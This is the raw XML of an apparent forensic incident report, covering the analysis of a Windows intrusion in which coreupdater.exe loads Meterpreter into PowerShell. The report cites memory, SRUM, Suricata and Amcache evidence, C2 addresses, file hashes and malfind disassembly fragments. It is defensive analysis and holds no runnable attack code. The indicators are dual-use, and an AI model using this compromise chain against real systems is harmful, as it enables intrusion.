          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>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suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=333817 sent=222046 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=170146 sent=26570 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process list (pslist)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, pslist)</w:t>
              <w:br/>
              <w:t>coreupdater.ex</w:t>
              <w:br/>
              <w:t>PID=8324 | PPID=4008 | ImageFileName=coreupdater.ex | SessionId=3 | Threads=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.pslist.PsList.jsonl#50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-016: Memory: PowerShell PID 3316 (ricksanchez, Domain Admin) hosts reflective Meterpreter payload with a live C2 socket to 203.78.103.109:443</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artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1059.001, T1620, T1547.001, T1071.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.483780 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>vol_pstree/pslist: powershell.exe PID 508 (PPID 1380, missing from all lists) ran from 05:08:37 to 05:08:43 and started powershell.exe PID 3316 (05:08:43, running, 11 threads) with child conhost.exe PID 728, session 2. getsids: PID 508/3316 run as S-1-5-21-2232410529-1445159330-2725690660-1106 (ricksanchez), a member of Domain Admins (-512), at Medium integrity. vol_malfind PID 3316: an RWX VadS region at 0x10c6c070000 starts with an MZ header, plus other private RWX regions. vol_suspicious_threads: TID 3892 starts in non-file-backed VAD 0x10c6bb00000 with PAGE_EXECUTE_READWRITE. vol_cmdline returned no arguments (PEB not readable). netstat: 10.42.85.115:50972 -&gt; 203.78.103.109:443 ESTABLISHED. Suricata flow row 16628: flow_start 06:08:45+0200 = 05:08:45 host UTC, still established at capture. SRUM: powershell.exe (ricksanchez) 178,042 B received / 15,721 B sent in the 05:14 slot. conhost console history: CommandCount 0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>This is the in-memory result of the HKLM Run key 'coreupdate' loader already described in F-010. The memory image shows that the shellcode loaded a PE (the Meterpreter stage) into PowerShell PID 3316 and that the session was still active when memory was captured. The account is a Domain Admin, which raises the impact to the whole domain C137.local. Parent PID 1380 had exited and could not be resolved.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (8)</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r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "36", "Disasm": "\"\n0x10c6c070000:\tpop\tr10\n0x10c6c070002:\tnop\t\n0x10c6c070003:\tadd\tbyte ptr [rbx], al\n0x10c6c070005:\tadd\tbyte ptr [rax], al\n0x10c6c070007:\tadd\tbyte ptr [rax + rax], al\n0x10c6c07000a:\tadd\tbyte ptr [rax], al\"", "End VPN": "1152863780863", "File output": "Disabled", "Hexdump": "4d 5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process list (pslist)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, pslist)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=3316 | PPID=508 | ImageFileName=powershell.exe | SessionId=2 | Threads=11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.pslist.PsList.jsonl#81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netstat</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volatility/windows.netstat.NetStat.jsonl#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>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suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\windowspowershell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>received=178042 sent=15721 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#206</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</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"Domain Admins", "PID": "508", "Process": "powershell.exe", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#1062</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_suspicious_threads</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Address": "1152857931776", "Context": "Win32Start", "Note": "VAD at base address (0x10c6bb00000) hosting this thread has an unexpected starting protection PAGE_EXECUTE_READWRITE", "PID": "3316", "Process": "powershell.exe", "TID": "3892", "VAD Path": "&lt;Non-File Backed Region&gt;"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.suspicious_threads.SuspiciousThreads.jsonl#44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "1", "Disasm": "\"\n0x7df4f5a80000:\tadd\tbyte ptr [rax + rax + 0x65], dh\n0x7df4f5a80004:\tadd\tbyte ptr [rcx], cl\n0x7df4f5a80006:\tadd\tbyte ptr cs:[rax], dh\n0x7df4f5a8000a:\toutsb\tdx, byte ptr [rsi]\n0x7df4f5a8000b:\tadd\tbyte ptr [rdi], ah\n0x7df4f5a8000e:\tor\tbyte ptr [rdx], al\n0x7df4f5a80010:\tjg\t0x7df</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Network traffic (PCAP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Analysed case001.pcap (SHA256 09ABF49E..., window 2020-09-18 21:58:07 → 2020-09-19 05:38:57 pcap-UTC, pcap ≈1 h behind host clock, re-validated via RDP flow vs 4624 and C2 flow vs Prefetch). Alerts qualified: the true positives are RDP nmap scan + 198 Administrator RDP login requests from 194.61.24.102 to the DC, coreupdater.exe HTTP downloads (DC 02:24:06, workstation 02:39:58 pcap), and 'PE over raw TCP' + Metasploit Bind_API on 5 sessions to 203.78.103.109:443 (3 DC, 2 workstation); the rest is ET INFO/USER_AGENTS noise. F-017: network object hashes (MD5 eed41b45..., SHA1 fd153c66..., SHA256 10f3b920...) match Amcache; C2 flows 50875 (02:40:49→end, 280 KB up/1.76 MB down) and 50972 (04:08:45→end) match Prefetch/Run-key timings and memory netscan ESTABLISHED sockets. F-018: full RDP chain 194.61.24.102 → DC → DESKTOP-SDN1RPT (flows 02:35:55-02:52:14 pcap = 4624 type 10 session). F-011 complemented with disk/memory refs. No DNS for attacker IPs, no lateral movement from the workstation, no cleartext exfiltration; 10.90.90.90 DNSBL sinkhole is environment. Timeline T-014..T-016, IOCs MD5 + URL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-017: Network ↔ disk ↔ memory: coreupdater.exe HTTP download to 10.42.85.115 hash-identical to Amcache entry; two Meterpreter stage/C2 sessions to 203.78.103.109:443 owned by the host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artifact:amcache (files)</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1071.001, T1573, T1095</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571 → 2020-09-19 04:08:45.783080</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Capture case001.pcap (197,583,252 bytes, SHA256 09ABF49EFEA1852E047987D92907704D47F36D75F6C8056E2CAFA6CC027791CB). Suricata timestamps are +0200 and the pcap clock runs ~1 h behind the host clock (F-011); times below are pcap-UTC [host-clock UTC in brackets].</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) HTTP: 10.42.85.115:50840 GET http://194.61.24.102/ at 02:39:26 [03:39:26], then 10.42.85.115:50864 GET /coreupdater.exe at 02:39:58.41 [03:39:58], UA "Mozilla/5.0 ... Edge/18.19041", Referer http://194.61.24.102/, 200, application/x-msdos-program, 7168 bytes (eve_http#156). File extracted by Suricata: MD5 eed41b4500e473f97c50c7385ef5e374, SHA1 fd153c66386ca93ec9993d66a84d6f0d129a3a5c, SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6 (eve_fileinfo#138). Alerts: ET INFO Executable Download from dotted-quad Host, ET INFO PE EXE or DLL Windows file download HTTP, ET HUNTING Dotted Quad Host MZ Response (eve_alert#442-444). The same file (same hashes) was fetched earlier by the DC 10.42.85.10 at 02:24:06 with an IE11 UA (eve_fileinfo#106). Disk: Amcache UnassociatedFileEntries coreupdater.exe SHA1 fd153c66386ca93ec9993d66a84d6f0d129a3a5c (key 03:40:45 host) — exact hash match.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(2) C2 session #1: flow 10.42.85.115:50875 → 203.78.103.109:443, start 02:40:49.936 [03:40:49 = coreupdater.exe Prefetch run time], still established at end of capture 05:38:44, 280,374 B to server / 1,764,209 B to client, app_proto 'failed' (not parsable TLS) (eve_flow#29788). Alerts at 02:40:50: ET HUNTING PE EXE Download over raw TCP + ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server) (eve_alert#445/446) = Meterpreter stage (metsrv DLL) delivered over the socket. Memory: netscan 10.42.85.115:50875 → 203.78.103.109:443 ESTABLISHED (NetScan#110).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(3) C2 session #2: flow 10.42.85.115:50972 → 203.78.103.109:443, start 04:08:45.48 [05:08:45 = Run key 'coreupdate' PowerShell loader], established to end of capture 05:38:42, 39,409 B up / 488,552 B down (eve_flow#16628); alerts eve_alert#453/455 (PE over raw TCP + Bind_API) at 04:08:45. Memory: netscan 50972 → 203.78.103.109:443 ESTABLISHED (NetScan#114).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No DNS resolution precedes either attacker IP: both are contacted by raw IP. No other flows of 10.42.85.115 to 194.61.24.102/203.78.103.109 exist.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
